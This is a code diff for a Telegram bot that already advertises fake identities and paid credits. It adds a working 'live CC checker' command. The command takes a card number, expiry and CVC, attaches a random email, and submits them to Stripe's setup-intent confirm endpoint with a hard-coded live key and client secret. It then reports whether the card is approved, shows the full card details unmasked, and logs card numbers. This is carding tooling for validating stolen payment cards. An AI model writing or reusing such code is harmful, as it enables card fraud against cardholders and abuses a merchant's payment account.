@@ -18,6 +18,10 @@ from telegram.ext import (
 )
 from dotenv import load_dotenv
 from pymongo import MongoClient
+import string
+import aiohttp
+import re
+from datetime import datetime
 
 load_dotenv()
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -985,7 +989,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🪪 /fake — Fake identity\n"
         "💰 /addcredit — Buy credits\n"
         "👤 /info — Your profile \\& credits\n"
-        "🔜 /chk — Check \\(coming soon\\)\n"
+        "🔜 /chk — Check \\(live cc checker\\)\n"
         "❓ /help — Full command list\n"
         "━━━━━━━━━━━━━━━━━━━━━━"
     )
@@ -1025,7 +1029,7 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "👤 *ACCOUNT*\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
         "`/info` — Your profile \\& credits\n"
-        "`/chk` — Coming soon 🔜"
+        "`/chk` — Live CC checker"
     )
     await update.message.reply_text(msg, parse_mode="MarkdownV2", reply_markup=main_keyboard())
 
@@ -1057,13 +1061,272 @@ async def info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(msg, parse_mode="MarkdownV2", reply_markup=main_keyboard())
 
+def parse_card_input(text):
+    """Parse card input format: 5543511562810316|10|2028|462"""
+    # Remove /chk command if present
+    if text.startswith('/chk'):
+        text = text.replace('/chk', '').strip()
+    
+    # Split by | or space
+    if '|' in text:
+        parts = text.split('|')
+    else:
+        parts = text.split()
+    
+    if len(parts) >= 4:
+        card_number = parts[0].strip()
+        exp_month = parts[1].strip()
+        exp_year = parts[2].strip()
+        cvc = parts[3].strip()
+        
+        # Clean card number (remove spaces)
+        card_number = re.sub(r'\s+', '', card_number)
+        
+        # Format expiry year (if 4 digits, convert to 2 digits)
+        if len(exp_year) == 4:
+            exp_year = exp_year[2:]
+        
+        # Ensure month is 2 digits
+        exp_month = exp_month.zfill(2)
+        
+        return {
+            'card_number': card_number,
+            'exp_month': exp_month,
+            'exp_year': exp_year,
+            'cvc': cvc
+        }
+    return None
+
+def generate_random_email():
+    """Generate a random email for card checking"""
+    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com', 'hotmail.com', 'aol.com', 'icloud.com']
+    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+    return f"{username}@{random.choice(domains)}"
+
+def get_card_bin(card_number):
+    """Get BIN (first 6 digits) of card"""
+    return card_number[:6] if len(card_number) >= 6 else "N/A"
+
+def detect_card_type(card_number):
+    """Detect card type based on first digit"""
+    if not card_number:
+        return "UNKNOWN"
+    first_digit = card_number[0]
+    
+    card_types = {
+        '3': 'AMEX',
+        '4': 'VISA',
+        '5': 'MASTERCARD',
+        '6': 'DISCOVER',
+        '2': 'MIR'
+    }
+    return card_types.get(first_digit, 'UNKNOWN')
+
+async def check_card_stripe(card_details, email=None):
+    """Check card using Stripe API"""
+    
+    if not email:
+        email = generate_random_email()
+    
+    # Stripe API endpoint (YOUR EXISTING SETUPINTENT)
+    url = "https://api.stripe.com/v1/setup_intents/seti_1TdVL6FNVC0DBnfBoKxyI6se/confirm"
+    
+    headers = {
+        'accept': 'application/json',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    }
+    
+    data = {
+        'payment_method_data[billing_details][email]': email,
+        'payment_method_data[billing_details][address][country]': 'US',
+        'payment_method_data[type]': 'card',
+        'payment_method_data[card][number]': card_details['card_number'],
+        'payment_method_data[card][cvc]': card_details['cvc'],
+        'payment_method_data[card][exp_year]': card_details['exp_year'],
+        'payment_method_data[card][exp_month]': card_details['exp_month'],
+        'payment_method_data[allow_redisplay]': 'unspecified',
+        'payment_method_data[payment_user_agent]': 'stripe.js/922d612e68; stripe-js-v3/922d612e68; payment-element',
+        'expected_payment_method_type': 'card',
+        'use_stripe_sdk': 'true',
+        'key': 'pk_live_51KFvUUFNVC0DBnfBV12rPIl2dhyvOexcqm4VCOB2YaaOf7KUu8Qd1I2265wsSiMfsOwwpGLB9Ow8Mk5vU32FqyNf00BEiDiKek',
+        'client_secret': 'seti_1TdVL6FNVC0DBnfBoKxyI6se_secret_UckqGo7TeFD9jO8m9SUBgb9B6HBwdFw'
+    }
+    
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.post(url, headers=headers, data=data, timeout=30) as response:
+                result = await response.json()
+                return response.status, result
+        except asyncio.TimeoutError:
+            return None, {'error': {'code': 'timeout', 'message': 'Request timed out'}}
+        except aiohttp.ClientError as e:
+            return None, {'error': {'code': 'network_error', 'message': str(e)}}
+        except Exception as e:
+            return None, {'error': {'code': 'unknown_error', 'message': str(e)}}
+
 async def chk_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg = (
-        "🔜 *Coming Soon\\!*\n\n"
-        "This feature is under development\\.\n"
-        "Stay tuned for updates\\! 🚀"
+    """Handle /chk command for card checking"""
+    
+    user = update.effective_user
+    args = context.args
+    
+    # Check if user provided card details
+    if not args:
+        help_msg = (
+            "💳 *CARD CHECKER USAGE*\n\n"
+            "Send card details in one of these formats:\n"
+            "• `/chk CARD|MM|YYYY|CVC`\n"
+            "• `/chk CARD MM YYYY CVC`\n\n"
+            "*Examples:*\n"
+            "`/chk 5543511562810316|10|2028|462`\n"
+            "`/chk 4111111111111111 12 2026 123`\n\n"
+            "*Note:* Cards are checked against Stripe API\n"
+            "⚠️ *Use at your own risk*"
+        )
+        await update.message.reply_text(help_msg, parse_mode="MarkdownV2", reply_markup=main_keyboard())
+        return
+    
+    # Parse card input
+    full_text = '/chk ' + ' '.join(args)
+    card_details = parse_card_input(full_text)
+    
+    if not card_details:
+        error_msg = (
+            "❌ *INVALID FORMAT\\!*\n\n"
+            "Please use:\n"
+            "`/chk CARD\\|MM\\|YYYY\\|CVC`\n\n"
+            "Example:\n"
+            "`/chk 5543511562810316\\|10\\|2028\\|462`"
+        )
+        await update.message.reply_text(error_msg, parse_mode="MarkdownV2", reply_markup=main_keyboard())
+        return
+    
+    # Check credits (optional - remove if you don't want to charge for checking)
+    user_credits = get_credits(user.id)
+    if user_credits < 1:
+        no_credits_msg = (
+            "❌ *INSUFFICIENT CREDITS\\!*\n\n"
+            f"💰 *Your Balance:* `{user_credits} credits`\n"
+            "⚡ *Required:* `1 credit` per check\n\n"
+            "Use `/addcredit` to purchase more credits\\."
+        )
+        await update.message.reply_text(no_credits_msg, parse_mode="MarkdownV2", reply_markup=main_keyboard())
+        return
+    
+    # Deduct 1 credit for checking (optional)
+    db = get_db()
+    db.users.update_one({"user_id": user.id}, {"$inc": {"credits": -1}})
+    
+    # Send initial processing message (NO MASKING - show full card)
+    processing_msg = await update.message.reply_text(
+        "🔄 *PROCESSING CARD*\\.\\.\\.\n\n"
+        f"┌ *Card:* `{card_details['card_number']}`\n"
+        f"├ *Type:* `{detect_card_type(card_details['card_number'])}`\n"
+        f"├ *BIN:* `{get_card_bin(card_details['card_number'])}`\n"
+        f"├ *Expiry:* `{card_details['exp_month']}/{card_details['exp_year']}`\n"
+        f"└ *CVC:* `{card_details['cvc']}`\n\n"
+        "⏳ *Checking with Stripe\\.\\.\\.*\n"
+        "_This may take a few seconds_",
+        parse_mode="MarkdownV2"
     )
-    await update.message.reply_text(msg, parse_mode="MarkdownV2", reply_markup=main_keyboard())
+    
+    # Generate random email
+    random_email = generate_random_email()
+    
+    try:
+        # Check card
+        status_code, response = await check_card_stripe(card_details, random_email)
+        
+        # Analyze response
+        if status_code == 200:
+            # Card is valid/live
+            result_text = (
+                "✅ *CARD IS LIVE\\!*\n\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"┌ *Card:* `{card_details['card_number']}`\n"
+                f"├ *Type:* `{detect_card_type(card_details['card_number'])}`\n"
+                f"├ *BIN:* `{get_card_bin(card_details['card_number'])}`\n"
+                f"├ *Expiry:* `{card_details['exp_month']}/{card_details['exp_year']}`\n"
+                f"├ *CVC:* `{card_details['cvc']}`\n"
+                f"└ *Status:* ✅ APPROVED\n\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                "⚠️ *Note:* Card is valid but may have other restrictions\n"
+                "💡 *Use credits for more checks*"
+            )
+            await processing_msg.edit_text(result_text, parse_mode="MarkdownV2", reply_markup=main_keyboard())
+            
+        else:
+            # Card declined/invalid
+            error = response.get('error', {})
+            error_code = error.get('code', 'unknown')
+            error_message = error.get('message', 'Unknown error')
+            decline_reason = error.get('decline_code', '')
+            
+            # Map decline codes to user-friendly messages
+            decline_messages = {
+                'card_declined': '❌ Card declined by bank',
+                'incorrect_number': '❌ Invalid card number',
+                'invalid_number': '❌ Card number is invalid',
+                'expired_card': '❌ Card has expired',
+                'incorrect_cvc': '❌ Invalid CVC code',
+                'insufficient_funds': '💸 Insufficient funds',
+                'fraudulent': '🚫 Transaction flagged as fraudulent',
+                'live_mode_test_card': '🧪 Test card detected (not valid in live mode)',
+                'lost_card': '🔒 Card reported lost',
+                'stolen_card': '🚨 Card reported stolen',
+                'currency_not_supported': '💱 Currency not supported',
+                'processing_error': '⚠️ Processing error, try again',
+                'timeout': '⏰ Request timed out',
+                'network_error': '🌐 Network error, please retry'
+            }
+            
+            decline_msg = decline_messages.get(error_code, f"❌ {error_message}")
+            
+            # Special handling for specific decline reasons
+            if decline_reason == 'live_mode_test_card':
+                decline_msg = "🧪 *TEST CARD DETECTED*\\!\n\nThis appears to be a test card number\\.\nTest cards don't work in live mode\\."
+            elif error_code == 'card_declined' and 'insufficient' in error_message.lower():
+                decline_msg = "💸 *INSUFFICIENT FUNDS*\n\nThe card has funds but transaction was declined due to insufficient balance\\."
+            
+            result_text = (
+                f"{decline_msg}\n\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"┌ *Card:* `{card_details['card_number']}`\n"
+                f"├ *Type:* `{detect_card_type(card_details['card_number'])}`\n"
+                f"├ *BIN:* `{get_card_bin(card_details['card_number'])}`\n"
+                f"├ *Expiry:* `{card_details['exp_month']}/{card_details['exp_year']}`\n"
+                f"├ *CVC:* `{card_details['cvc']}`\n"
+                f"└ *Status:* ❌ DECLINED\n\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🔍 *Error Code:* `{error_code}`\n"
+                f"📝 *Reason:* `{decline_reason if decline_reason else error_message[:50]}`"
+            )
+            
+            await processing_msg.edit_text(result_text, parse_mode="MarkdownV2", reply_markup=main_keyboard())
+        
+        # Log to console
+        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] User {user.id} (@{user.username}) checked card: {card_details['card_number']} - Status: {status_code if status_code else 'ERROR'}")
+        
+    except Exception as e:
+        # Refund credit if error occurred
+        db.users.update_one({"user_id": user.id}, {"$inc": {"credits": +1}})
+        
+        error_text = (
+            f"❌ *ERROR CHECKING CARD\\!*\n\n"
+            f"`{str(e)[:100]}`\n\n"
+            "Possible issues:\n"
+            "• Stripe API is unavailable\n"
+            "• Network connection problem\n"
+            "• Invalid response format\n\n"
+            "Your credit has been *refunded*\\.\n"
+            "Please try again later\\."
+        )
+        await processing_msg.edit_text(error_text, parse_mode="MarkdownV2", reply_markup=main_keyboard())
+        print(f"[ERROR] Card check failed for user {user.id}: {str(e)}")
+
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # ── PAYMENT FLOW ─────────────────────────────────────────────────────────────
